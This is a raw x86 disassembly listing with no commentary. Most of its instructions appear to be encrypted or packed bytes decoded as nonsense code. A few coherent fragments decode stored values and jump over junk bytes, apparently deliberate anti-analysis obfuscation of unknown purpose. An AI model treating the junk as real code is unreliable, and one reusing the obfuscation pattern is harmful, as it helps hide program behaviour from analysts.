  40199e:	push   ebp
  40199f:	aad    0x8c
  4019a1:	int3   
  4019a2:	imul   esi,eax,0x6c2591d2
  4019a8:	test   eax,0x3cfd8e04
  4019ad:	adc    cl,BYTE PTR [esi-0x4d343eb5]
  4019b3:	or     cl,BYTE PTR [ebx+edx*4-0x4f]
  4019b7:	jae    0x4019f6
  4019b9:	jnp    0x4019c1
  4019bb:	fst    QWORD PTR [esi]
  4019bd:	icebp  
  4019be:	cld    
  4019bf:	stos   BYTE PTR es:[edi],al
  4019c0:	add    BYTE PTR [ecx-0x41eda2b9],al
  4019c6:	add    bl,BYTE PTR [ecx]
  4019c8:	pop    esi
  4019c9:	push   esp
  4019ca:	ss popf 
  4019cc:	or     eax,0x28ab11fd
  4019d1:	xor    esp,ecx
  4019d3:	lds    eax,FWORD PTR [eax+0x36e8f887]
  4019d9:	rcl    DWORD PTR [esi+0x71],0xd
  4019dd:	sub    bh,BYTE PTR [ebx+0x2a]
  4019e0:	les    sp,DWORD PTR [edi-0x54]
  4019e4:	lds    edx,FWORD PTR [ebx+0x5e]
  4019e7:	jg     0x4019d0
  4019e9:	push   ebx
  4019ea:	std    
  4019eb:	pop    DWORD PTR [esp+eiz*2-0xb70a4e]
  4019f2:	adc    edx,ebx
  4019f4:	mov    ecx,0x1d699ab2
  4019f9:	call   0xed03:0xac3a3408
  401a00:	pushf  
  401a01:	add    eax,0xa1d27b10
  401a06:	jge    0x401a80
  401a08:	test   BYTE PTR [ecx-0x40bc1bc8],ch
  401a0e:	push   esp
  401a0f:	loope  0x401a2e
  401a11:	mov    esp,0xb0a559c9
  401a16:	or     eax,0x349735d0
  401a1b:	jg     0x4019e2
  401a1d:	sahf   
  401a1e:	push   ebp
  401a1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a20:	push   es
  401a21:	jge    0x401a5e
  401a23:	push   ds
  401a24:	push   es
  401a25:	adc    al,0xe7
  401a27:	mov    BYTE PTR [ebx+esi*2-0x4e448b95],dl
  401a2e:	lds    edi,FWORD PTR ds:0xc1ac8da1
  401a34:	inc    ebp
  401a35:	pop    esi
  401a36:	rcr    BYTE PTR [edi+0x0],cl
  401a39:	fwait
  401a3a:	addr16 sbb eax,edx
  401a3d:	in     eax,dx
  401a3e:	(bad)  
  401a40:	mov    dh,0xf5
  401a42:	xor    al,0xcd
  401a44:	sbb    al,0xaa
  401a46:	mov    edx,eax
  401a48:	lods   eax,DWORD PTR ds:[esi]
  401a49:	imul   esi,DWORD PTR [esi+0xa070750],0xf55907ef
  401a53:	js     0x4019e8
  401a55:	sahf   
  401a56:	bound  ecx,QWORD PTR [edi+0x6a]
  401a59:	scas   eax,DWORD PTR es:[edi]
  401a5a:	push   edx
  401a5b:	cmp    eax,0x4b1d4c26
  401a60:	scas   eax,DWORD PTR es:[edi]
  401a61:	imul   esp,DWORD PTR [ebx],0xffffff99
  401a64:	push   ebx
  401a65:	xchg   esp,eax
  401a66:	push   ds
  401a67:	icebp  
  401a68:	loop   0x401a48
  401a6a:	cld    
  401a6b:	icebp  
  401a6c:	stc    
  401a6d:	mov    eax,0xc59208dc
  401a72:	jb     0x401a8f
  401a74:	imul   ebp,ecx,0xffffffb0
  401a77:	mov    DWORD PTR [ebp-0x50],ebx
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	xchg   ebp,eax
  401a8c:	fcmovnb st,st(2)
  401a8e:	inc    edi
  401a8f:	push   cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401ad6
  401a98:	push   ebp
  401a99:	or     BYTE PTR [ebx-0x6976cf9b],ch
  401a9f:	cmc    
  401aa0:	imul   edx,ecx,0x53818eb
  401aa6:	icebp  
  401aa7:	lods   eax,DWORD PTR ds:[esi]
  401aa8:	sbb    DWORD PTR [esi],edx
  401aaa:	aam    0xd8
  401aac:	daa    
  401aad:	repnz xor BYTE PTR [ebx],bl
  401ab0:	xchg   esi,eax
  401ab1:	xor    ch,BYTE PTR [edx*8-0x25db80a6]
  401ab8:	push   0x3fbcaca
  401abd:	jno    0x401a61
  401abf:	mov    ecx,0xfd656e3d
  401ac4:	push   cs
  401ac5:	adc    BYTE PTR [ebp-0x74],bl
  401ac8:	adc    DWORD PTR [esi+ebp*1+0x16175633],ecx
  401acf:	mov    DWORD PTR [esi+0x6fc54fa5],0xa2b708d2
  401ad9:	cdq    
  401ada:	add    eax,DWORD PTR [edx+eiz*1+0x6f]
  401ade:	pop    ds
  401adf:	sub    eax,0x267fabf7
  401ae4:	add    BYTE PTR [ebx-0x38],dl
  401ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ae8:	xchg   edi,eax
  401ae9:	les    edi,FWORD PTR ds:0x1fa18950
  401aef:	sub    al,0xcf
  401af1:	leave  
  401af2:	push   0xffffffec
  401af4:	add    eax,0x99b93ef1
  401af9:	adc    ch,ch
  401afb:	xor    al,0xe6
  401afd:	fnsave [esi]
  401aff:	in     eax,0x61
  401b01:	sti    
  401b02:	xchg   DWORD PTR [esi+edx*2-0x5c],esp
  401b06:	push   cs
  401b07:	inc    edi
  401b08:	into   
  401b09:	enter  0x89c1,0x52
  401b0d:	sub    ebp,DWORD PTR fs:[edx]
  401b10:	sbb    al,BYTE PTR [esi+edi*1-0x7d63a9f9]
  401b17:	rcr    DWORD PTR [esi+0x2abe67ab],1
  401b1d:	ret    0xae8a
  401b20:	mov    cl,BYTE PTR [ebx-0x23e8571d]
  401b26:	xchg   edx,eax
  401b27:	or     DWORD PTR [esi-0x2812f614],ecx
  401b2d:	je     0x401ab1
  401b2f:	push   ecx
  401b30:	dec    ecx
  401b31:	movlps QWORD PTR [edx-0x37],xmm4
  401b35:	xlat   BYTE PTR ds:[ebx]
  401b36:	sahf   
  401b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b38:	popf   
  401b39:	push   es
  401b3a:	sbb    bh,cl
  401b3c:	push   ecx
  401b3d:	pop    ebx
  401b3e:	add    al,0x93
  401b40:	jae    0x401b16
  401b42:	add    ah,dl
  401b44:	popa   
  401b45:	adc    al,0xf2
  401b47:	fs or  esi,ebx
  401b4a:	aam    0x59
  401b4c:	loope  0x401b61
  401b4e:	xchg   ecx,eax
  401b4f:	sbb    DWORD PTR [esi+0x168c1bc8],edi
  401b55:	xor    DWORD PTR ds:0x46d2b5be,ecx
  401b5b:	jns    0x401aeb
  401b5d:	les    eax,FWORD PTR [ebp-0x14]
  401b60:	xchg   esp,eax
  401b61:	push   ebx
  401b62:	or     bh,BYTE PTR [edi+0x8]
  401b65:	ret    0x565d
  401b68:	(bad)  [ebx+0x2a802fad]
  401b6e:	push   0x93fd3679
  401b73:	call   FWORD PTR [edx+edx*8]
  401b76:	dec    esp
  401b77:	push   ebx
  401b78:	enter  0xb99c,0x4b
  401b7c:	push   ss
  401b7d:	adc    DWORD PTR cs:0x933d582f,esp
  401b84:	add    bl,BYTE PTR ds:[edi-0x7c]
  401b88:	icebp  
  401b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b8a:	test   al,0xbd
  401b8c:	adc    al,0xa8
  401b8e:	imul   ecx,DWORD PTR [ebp+0x6e3544b1],0xffffffd0
  401b95:	xchg   esi,eax
  401b96:	fst    QWORD PTR [esp+edi*1+0x52]
  401b9a:	fild   WORD PTR [eax-0x5684e202]
  401ba0:	sbb    eax,0x34222401
  401ba5:	fs cdq 
  401ba7:	xchg   esi,eax
  401ba8:	jb     0x401bdc
  401baa:	push   eax
  401bab:	in     al,dx
  401bac:	inc    eax
  401bad:	sbb    cl,BYTE PTR [edx]
  401baf:	lods   al,BYTE PTR ds:[esi]
  401bb0:	div    DWORD PTR fs:[ebx+0x71cfc2f8]
  401bb7:	outs   dx,BYTE PTR ds:[esi]
  401bb8:	mov    DWORD PTR [edi+eax*1-0x3a],ecx
  401bbc:	sbb    DWORD PTR [esi+0x30],ebx
  401bbf:	xor    esi,DWORD PTR [ecx+0x3]
  401bc2:	mov    esp,DWORD PTR [ebp+0x28789b72]
  401bc8:	xchg   BYTE PTR [ecx],bl
  401bca:	jecxz  0x401b88
  401bcc:	retf   
  401bcd:	int3   
  401bce:	test   al,0x96
  401bd0:	sahf   
  401bd1:	ficom  DWORD PTR ds:0x27ec590b
  401bd7:	sbb    BYTE PTR ds:0xcef49a10,al
  401bdd:	out    dx,al
  401bde:	call   FWORD PTR fs:[esi]
  401be1:	xchg   BYTE PTR [edi],cl
  401be3:	outs   dx,BYTE PTR ds:[esi]
  401be4:	std    
  401be5:	stos   BYTE PTR es:[edi],al
  401be6:	add    eax,0x2d2ec7d8
  401beb:	dec    edi
  401bec:	inc    ebp
  401bed:	xor    ebp,ebx
  401bef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bf0:	mov    dl,0x19
  401bf2:	cmc    
  401bf3:	mov    al,ds:0x57b0ed15
  401bf8:	fbstp  TBYTE PTR [ecx+0x3ddd6b67]
  401bfe:	rcr    DWORD PTR [ebp-0x5c316d3a],1
  401c04:	adc    BYTE PTR [esi],bh
  401c06:	xchg   edx,eax
  401c07:	cmp    bl,al
  401c09:	jecxz  0x401b95
  401c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c0c:	xchg   edi,eax
  401c0d:	aaa    
  401c0e:	mov    dh,0x93
  401c10:	xor    al,0x87
  401c12:	inc    eax
  401c13:	imul   ebx,esp,0x19
  401c16:	inc    edi
  401c17:	and    DWORD PTR [ebx+eiz*8],esi
  401c1a:	clc    
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	mov    ebx,0x8a7a9aef
  401c45:	jns    0x401cc5
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401cb7
  401c4d:	lea    eax,[ecx-0x80]
  401c50:	aad    0x11
  401c52:	mov    BYTE PTR [edi],ch
  401c54:	mov    ah,0x49
  401c56:	fdiv   DWORD PTR [esi]
  401c58:	xor    ecx,DWORD PTR [esi]
  401c5a:	arpl   WORD PTR [edx+0x3d55ff32],dx
  401c60:	lods   al,BYTE PTR ds:[esi]
  401c61:	and    ecx,0x8433f2c6
  401c67:	push   0x1681e96c
  401c6c:	jge    0x401c21
  401c6e:	ss xchg edi,eax
  401c70:	imul   esi,ebp,0xb0df229b
  401c76:	inc    ebx
  401c77:	retf   0x1f71
  401c7a:	add    DWORD PTR [edi],eax
  401c7c:	js     0x401c1b
  401c7e:	push   cs
  401c7f:	or     eax,0x15e30548
  401c84:	aam    0xe2
  401c86:	ror    BYTE PTR [esp+edi*2+0x106e94f0],cl
  401c8d:	mov    ah,0x69
  401c8f:	int    0xc2
  401c91:	test   al,0xe
  401c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c94:	push   esi
  401c95:	dec    esi
  401c96:	call   DWORD PTR [eax+0x74]
  401c99:	or     ah,dh
  401c9b:	push   eax
  401c9c:	push   ss
  401c9d:	inc    eax
  401c9e:	add    dh,BYTE PTR [esi]
  401ca0:	jmp    0x9d5b:0xa1c836e3
  401ca7:	mov    cl,0x9f
  401ca9:	popf   
  401caa:	repnz mov esi,0xc991759f
  401cb0:	mov    ebp,0x312e7576
  401cb5:	ins    BYTE PTR es:[edi],dx
  401cb6:	jnp    0x401cb6
  401cb8:	iret   
  401cb9:	(bad)  
  401cba:	fbld   TBYTE PTR [ecx+0x43e7eede]
  401cc0:	sub    DWORD PTR [ebx+0x2c],edx
  401cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cc4:	sbb    esi,DWORD PTR [eax+0x5cd125d2]
  401cca:	call   0xdd594a9
  401ccf:	push   esp
  401cd0:	cmc    
  401cd1:	repnz cwde 
  401cd3:	adc    DWORD PTR [edi],esp
  401cd5:	mov    WORD PTR [ebx+0xc],fs
  401cd8:	jge    0x401c61
  401cda:	(bad)  
  401cdc:	mov    BYTE PTR [ebp+0x29],0x9d
  401ce0:	sub    BYTE PTR [ebx+0x575d97b7],ch
  401ce6:	cld    
  401ce7:	pushf  
  401ce8:	lea    edi,[ebx+0x36d6509]
  401cee:	and    ebp,eax
  401cf0:	mov    eax,ds:0x841ece95
  401cf5:	retf   
  401cf6:	js     0x401ce7
  401cf8:	scas   eax,DWORD PTR es:[edi]
  401cf9:	mov    ebx,0xb4f48492
  401cfe:	or     ebx,ebx
  401d00:	xor    ecx,DWORD PTR [ebx+0x23]
  401d03:	and    ch,dl
  401d05:	mov    ah,0x49
  401d07:	and    BYTE PTR [esi],dh
  401d09:	jnp    0x401cab
  401d0b:	push   0x34d001f9
  401d10:	xchg   DWORD PTR [edx-0x8],ebx
  401d13:	adc    esi,0xbf2ae187
  401d19:	maxps  xmm7,xmm1
  401d1c:	adc    BYTE PTR [ecx],bh
  401d1e:	daa    
  401d1f:	outs   dx,DWORD PTR ds:[esi]
  401d20:	das    
  401d21:	lock cs dec edi
  401d24:	pusha  
  401d25:	adc    eax,0x580305b
  401d2a:	pop    esi
  401d2b:	xor    BYTE PTR [edi+edi*8-0x4c34ff1c],dh
  401d32:	je     0x401cec
  401d34:	xchg   edx,eax
  401d35:	fimul  WORD PTR [ebp-0x22]
  401d38:	sub    DWORD PTR [ebx],ebx
  401d3a:	es dec ebx
  401d3c:	stos   BYTE PTR es:[edi],al
  401d3d:	push   ds
  401d3e:	adc    ah,cl
  401d40:	cmp    DWORD PTR [eax-0x62],eax
  401d43:	mov    dh,0x36
  401d45:	loop   0x401d50
  401d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d48:	jg     0x401d4c
  401d4a:	xchg   edi,eax
  401d4b:	fstp   QWORD PTR [edx]
  401d4d:	mov    es,WORD PTR [ecx]
  401d4f:	cwde   
  401d50:	test   DWORD PTR [esi+0x54815a62],esp
  401d56:	jge    0x401d94
  401d58:	aaa    
  401d59:	xchg   ebp,eax
  401d5a:	outs   dx,BYTE PTR ds:[esi]
  401d5b:	js     0x401d5f
  401d5d:	push   ebx
  401d5e:	push   es
  401d5f:	jl     0x401d8b
  401d61:	sbb    eax,0x1e4e7506
  401d66:	mov    bl,0x12
  401d68:	pop    ds
  401d69:	(bad)  
  401d6a:	in     eax,dx
  401d6b:	push   es
  401d6c:	cwde   
  401d6d:	(bad)  
  401d6e:	hlt    
  401d6f:	outs   dx,DWORD PTR ds:[esi]
  401d70:	(bad)  [esi-0x75]
  401d73:	fadd   DWORD PTR [ebp-0x5bba98cc]
  401d79:	xlat   BYTE PTR ds:[ebx]
  401d7a:	mov    ah,0xa9
  401d7c:	dec    ecx
  401d7d:	dec    ecx
  401d7e:	pop    eax
  401d7f:	sbb    ebp,DWORD PTR [esi-0x257ab3d0]
  401d85:	sahf   
  401d86:	add    eax,0xbb1f85ed
  401d8b:	adc    DWORD PTR [edi-0x4cd54a7e],ebp
  401d91:	mov    al,0xb2
  401d93:	sbb    dh,BYTE PTR [edx-0x73]
  401d96:	pop    ss
  401d97:	sti    
  401d98:	shl    BYTE PTR [ebp+0x36bfc4bd],0xc2
  401d9f:	int3   
  401da0:	pop    ebx
  401da1:	mov    ds:0xe83de80a,eax
  401da6:	dec    ebp
  401da7:	test   DWORD PTR [esi+edi*4+0x7f],edi
  401dab:	mov    eax,ds:0xf5f7b698
  401db0:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401db2:	xchg   ebp,eax
  401db3:	xor    esp,DWORD PTR [ebx-0x5ed343d4]
  401db9:	ret    0xee64
  401dbc:	push   DWORD PTR [ecx]
  401dbe:	inc    esi
  401dbf:	aaa    
  401dc0:	or     eax,0xef39e13
  401dc5:	push   edx
  401dc6:	jno    0x401d60
  401dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dc9:	cmp    ecx,eax
  401dcb:	retf   0xe3c5
  401dce:	cmp    DWORD PTR [ecx],ebx
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x4d640ac8],ebp
  401e0d:	test   BYTE PTR [esi],dl
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e4a
  401e17:	retf   0x1418
  401e1a:	xor    eax,0xa321d8ac
  401e1f:	lods   eax,DWORD PTR ds:[esi]
  401e20:	loope  0x401dfd
  401e22:	pop    ss
  401e23:	xor    al,0xd0
  401e25:	xchg   ebp,eax
  401e26:	test   ecx,esp
  401e28:	add    DWORD PTR [ebp-0x5cb96818],ecx
  401e2e:	cwde   
  401e2f:	cmp    bl,ch
  401e31:	push   DWORD PTR [ebx+0x5f0449a1]
  401e37:	xchg   edi,eax
  401e38:	ret    0x2956
  401e3b:	adc    bl,BYTE PTR [edi+ecx*8]
  401e3e:	and    ebx,ebp
  401e40:	idiv   ebx
  401e42:	push   ecx
  401e43:	loope  0x401eae
  401e45:	adc    eax,0x2684c73e
  401e4a:	call   0xca10:0x62dbba8c
  401e51:	dec    ecx
  401e52:	lds    ebx,FWORD PTR [edi-0x17]
  401e55:	inc    ecx
  401e56:	mov    esp,0xb7f1aa7b
  401e5b:	imul   edi,DWORD PTR [eax-0x17cdd43d],0x3
  401e62:	or     al,0x95
  401e64:	das    
  401e65:	dec    eax
  401e66:	add    al,0xc
  401e68:	pop    ss
  401e69:	fldcw  WORD PTR [ebp+0x12683436]
  401e6f:	xchg   edi,eax
  401e70:	mov    bh,0x78
  401e72:	dec    ebp
  401e73:	dec    esp
  401e74:	pop    ecx
  401e75:	adc    eax,0xc17017f5
  401e7a:	xor    al,0x62
  401e7c:	cmp    dh,BYTE PTR [ebx+0x3f]
  401e7f:	adc    al,0x5d
  401e81:	inc    edx
  401e82:	adc    DWORD PTR [ecx+0x65a2ddd6],ecx
  401e88:	rcl    BYTE PTR [ecx-0x61],1
  401e8b:	fadd   QWORD PTR [ebx]
  401e8d:	push   eax
  401e8e:	sbb    dl,0xa9
  401e91:	jmp    FWORD PTR [edx]
  401e93:	push   edx
  401e94:	lea    esi,[eax+0x37417c31]
  401e9a:	cs jmp 0xf5d65c7a
  401ea0:	arpl   WORD PTR [edx-0x69],si
  401ea3:	in     al,dx
  401ea4:	fs aad 0xf3
  401ea7:	icebp  
  401ea8:	cmp    eax,0x55621db1
  401ead:	leavew 
  401eaf:	sbb    al,0x94
  401eb1:	or     edi,DWORD PTR [edx*8-0x3c366e88]
  401eb8:	iret   
  401eb9:	inc    eax
  401eba:	add    eax,DWORD PTR [esi+0x5c]
  401ebd:	jmp    0xa4361f58
  401ec2:	cli    
  401ec3:	(bad)  
  401ec4:	lock sub DWORD PTR [esi],ebx
  401ec7:	pop    es
  401ec8:	or     bh,BYTE PTR [ecx+0x2f]
  401ecb:	sbb    eax,0x479aa2b4
  401ed0:	add    al,0x8e
  401ed2:	fnsave [edi-0x47]
  401ed5:	push   ecx
  401ed6:	loopne 0x401e8f
  401ed8:	pop    ecx
  401ed9:	sub    eax,0xfd652247
  401ede:	(bad)  [eax+0x7a88d89e]
  401ee4:	fmul   st(6),st
  401ee6:	sbb    al,0x61
  401ee8:	ror    esi,cl
  401eea:	push   edi
  401eeb:	jnp    0x401ecf
  401eed:	push   edx
  401eee:	jg     0x401ee3
  401ef0:	xor    al,0x3c
  401ef2:	jmp    0x9326:0xeb1f9adf
  401ef9:	inc    esp
  401efa:	xor    BYTE PTR [edx+0x19],al
  401efd:	rcr    DWORD PTR [ecx-0x37],cl
  401f00:	xchg   edx,eax
  401f01:	aad    0x2a
  401f03:	sbb    dh,BYTE PTR [ecx]
  401f05:	and    DWORD PTR ds:[esi-0x1f345204],esp
  401f0c:	sub    BYTE PTR [esi-0x249f99ae],bh
  401f12:	fistp  QWORD PTR [ebp-0x29]
  401f15:	cvttps2pi mm7,QWORD PTR [esi]
  401f18:	pop    esi
  401f19:	in     eax,0x79
  401f1b:	loopne 0x401f9b
  401f1d:	lods   al,BYTE PTR ds:[esi]
  401f1e:	and    bh,al
  401f20:	js     0x401efa
  401f22:	inc    eax
  401f23:	add    esi,DWORD PTR [ecx-0x7f]
  401f26:	add    eax,0x276fa668
  401f2b:	jne    0x401f5e
  401f2d:	jp     0x401fa6
  401f2f:	lods   eax,DWORD PTR ds:[esi]
  401f30:	push   cs
  401f31:	push   eax
  401f32:	inc    ebp
  401f33:	fwait
  401f34:	cmp    eax,0x3100b343
  401f39:	cli    
  401f3a:	imul   edi,DWORD PTR [esi-0x285658d0],0xab1e07e0
  401f44:	fidivr DWORD PTR [edx+0x32]
  401f47:	ror    edi,cl
  401f49:	dec    ebx
  401f4a:	xchg   esp,eax
  401f4b:	pop    ss
  401f4c:	inc    esp
  401f4d:	sub    bh,BYTE PTR [eax+0x4f]
  401f50:	dec    eax
  401f51:	sub    eax,0x8a78c4d0
  401f56:	xor    al,BYTE PTR [esp+eax*2]
  401f59:	iret   
  401f5a:	sbb    ebx,ebp
  401f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f5d:	daa    
  401f5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f5f:	idiv   DWORD PTR [eax-0x6]
  401f62:	aaa    
  401f63:	sub    BYTE PTR [eax+eax*1],ch
  401f66:	mov    DWORD PTR [ecx],esp
  401f68:	je     0x401f51
  401f6a:	lock sub bh,BYTE PTR [eax+0x1e]
  401f6e:	jo     0x401f20
  401f70:	test   al,0xfb
  401f72:	push   ebx
  401f73:	and    edx,DWORD PTR [ebx+ecx*4]
  401f76:	mov    ah,0xce
  401f78:	(bad)
  401f7c:	pushf  
  401f7d:	and    eax,0x6aa86b13
  401f82:	sbb    ebx,DWORD PTR [ebx-0x3d44504b]
  401f88:	aad    0x2
  401f8a:	cmp    DWORD PTR [esi+0x1c],edi
  401f8d:	test   cl,0xff
  401f90:	mov    ch,0x68
  401f92:	mov    eax,DWORD PTR [eax-0x3843158e]
  401f98:	retf   
  401f99:	das    
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x82389024
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401fe0
  401fcc:	clc    
  401fcd:	jns    0x402007
  401fcf:	mov    ebx,0x88e92ccc
  401fd4:	xor    ecx,ebx
  401fd6:	pop    ds
  401fd7:	jno    0x40204a
  401fd9:	mov    ds:0x68e74730,eax
  401fde:	into   
  401fdf:	xor    eax,0x9fbcc009
  401fe4:	xor    eax,0xd043115a
  401fe9:	and    cl,bh
  401feb:	ins    BYTE PTR es:[edi],dx
  401fec:	aam    0x63
  401fee:	pop    ecx
  401fef:	jle    0x40205b
  401ff1:	mov    dh,0x57
  401ff3:	xchg   BYTE PTR [edi+0x6d35f12e],ah
  401ff9:	scas   eax,DWORD PTR es:[edi]
  401ffa:	pushf  
  401ffb:	fmul   st,st(0)
  401ffe:	pop    ds
  401fff:	add    BYTE PTR [ebp-0x28],0xad
  402003:	mov    DWORD PTR [eax-0x67],ebx
  402006:	and    al,cl
  402008:	das    
  402009:	inc    ebx
  40200a:	neg    BYTE PTR ds:0x3f60e795
  402010:	xor    DWORD PTR [eax],ecx
  402012:	push   edx
  402013:	mov    esp,0x87a2cd78
  402018:	scas   eax,DWORD PTR es:[edi]
  402019:	mov    al,ds:0xf6a3a8e0
  40201e:	pop    ebp
  40201f:	in     al,dx
  402020:	shl    DWORD PTR [esi+ebx*1],cl
  402023:	push   ebp
  402024:	repz leave 
  402026:	mov    esi,0x7505266d
  40202b:	je     0x401fb7
  40202d:	shl    DWORD PTR [ebp-0x4],cl
  402030:	pop    esi
  402031:	je     0x402002
  402033:	inc    edi
  402034:	xchg   ecx,eax
  402035:	mov    ds:0x6b0a7956,eax
  40203a:	dec    esp
  40203b:	sbb    BYTE PTR es:[ebx-0x6b585f96],ch
  402042:	or     dh,BYTE PTR es:[eax]
  402045:	adc    BYTE PTR [edx+0x10],ah
  402048:	mov    ebp,0xf9069d18
  40204d:	sub    al,0x81
  40204f:	int    0xc4
  402051:	mov    esi,0xcb6ad3d8
  402056:	mov    DWORD PTR [edi],esi
  402058:	repnz add BYTE PTR [eax],dl
  40205b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40205c:	stos   BYTE PTR es:[edi],al
  40205d:	sbb    al,0xee
  40205f:	pushf  
  402060:	test   al,0x51
  402062:	and    DWORD PTR [eax-0x77],edx
  402065:	push   edi
  402066:	frstor [esi-0x675bdc99]
  40206c:	xchg   esp,eax
  40206d:	sbb    BYTE PTR [edi-0x1b47b3c0],bl
  402073:	xchg   ebx,eax
  402074:	mov    ebp,0x26ed5186
  402079:	icebp  
  40207a:	loope  0x4020b2
  40207c:	(bad)  
  40207d:	in     al,dx
  40207e:	loopne 0x40200c
  402080:	mov    esi,0x812a6b04
  402085:	pop    ds
  402086:	aas    
  402087:	add    bh,dh
  402089:	stos   DWORD PTR es:[edi],eax
  40208a:	lea    ebx,[eax-0x29]
  40208d:	loope  0x4020a9
  40208f:	mov    bl,0xa4
  402091:	and    esp,edi
  402093:	ret    0xb33a
  402096:	fbld   TBYTE PTR [esi]
  402098:	leave  
  402099:	push   es
  40209a:	and    BYTE PTR [esp+eiz*4-0x21448743],0xb5
  4020a2:	lahf   
  4020a3:	xor    BYTE PTR [edx],dl
  4020a5:	add    cl,BYTE PTR [esi+ecx*2-0x48]
  4020a9:	(bad)  
  4020aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020ab:	dec    edx
  4020ac:	inc    ecx
  4020ad:	mov    esp,0xd7b9ed05
  4020b2:	mov    ds:0xb917a6fc,al
  4020b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020b8:	push   ss
  4020b9:	data16 daa 
  4020bb:	mov    eax,0x2fd2ef83
  4020c0:	mov    es,WORD PTR [edi+esi*8-0x62]
  4020c4:	fisubr DWORD PTR [esi-0x53]
  4020c7:	push   ebx
  4020c8:	loope  0x40207e
  4020ca:	jno    0x4020cf
  4020cc:	or     eax,0x5d1aa81
  4020d1:	xchg   ebp,eax
  4020d2:	ja     0x402109
  4020d4:	mov    ecx,0x39e52f71
  4020d9:	add    al,0x67
  4020db:	lds    edx,FWORD PTR [edx]
  4020dd:	push   esp
  4020de:	push   ss
  4020df:	and    dl,BYTE PTR [ebx]
  4020e1:	in     al,dx
  4020e2:	sbb    eax,0xcb7734cb
  4020e7:	daa    
  4020e8:	test   BYTE PTR [eax],al
  4020ea:	mov    al,ds:0x9247efa2
  4020ef:	push   eax
  4020f0:	popf   
  4020f1:	add    esp,DWORD PTR [edi-0xd]
  4020f4:	gs xchg ebp,eax
  4020f6:	mov    ds,WORD PTR [eax]
  4020f8:	and    ch,BYTE PTR [esi+esi*8]
  4020fb:	mov    ah,0x35
  4020fd:	push   es
  4020fe:	fdiv   QWORD PTR [ecx+0x13]
  402101:	xchg   ebx,eax
  402102:	dec    esp
  402103:	scas   eax,DWORD PTR es:[edi]
  402104:	push   ebx
  402105:	push   ebp
  402106:	pop    eax
  402107:	dec    ecx
  402108:	das    
  402109:	test   al,0x54
  40210b:	lahf   
  40210c:	inc    esi
  40210d:	(bad)  
  40210f:	imul   esi,DWORD PTR [ecx+esi*2-0x62b2d91a],0x8
  402117:	ins    DWORD PTR es:[edi],dx
  402118:	mov    eax,ds:0xdbd31fd3
  40211d:	xor    cl,cl
  40211f:	mov    bh,cl
  402121:	inc    esi
  402122:	mov    BYTE PTR [edi+0x6f],al
  402125:	fldcw  WORD PTR [esi-0x56b2d7a]
  40212b:	data16 sub WORD PTR [ebp+0x13976d33],di
  402133:	dec    edx
  402134:	jbe    0x40213d
